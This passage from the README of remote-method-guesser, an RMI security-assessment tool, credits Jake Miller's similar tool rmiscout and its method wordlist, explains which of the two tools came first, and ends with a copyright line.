and [Jake Miller](https://labs.bishopfox.com/tech-blog/rmiscout). *rmg* may appears to be a clone of [rmiscout](https://github.com/BishopFox/rmiscout) and indeed,
the provided functionalities are quite similar now. However, notice that *remote-method-guesser* was public since 2019 and before *rmiscout* was released in 2020.
In his implementation, *Jake* did a lot of things better than me and I had to decide whether to throw away my previous work or to adopt some features. I chose the second
approach, but implemented the different features slightly different than *rmiscout*. Still, huge credits to *Jake* for his idea of bruteforcing *remote methods* without really
invoking them. Now the community has two powerful tools to engage *RMI servers* during *blackbox* security assessments.

Furthermore, the [rmiscout wordlist](./wordlists/rmiscout.txt) was obviously copied from the *rmiscout* project (as you can already tell by the different license agreement).
Thanks *Jake*, for this awesome wordlist of *remote methods* collected from different *GitHub* repositories.

*Copyright 2020, Tobias Neitzel and the remote-method-guesser contributors.*
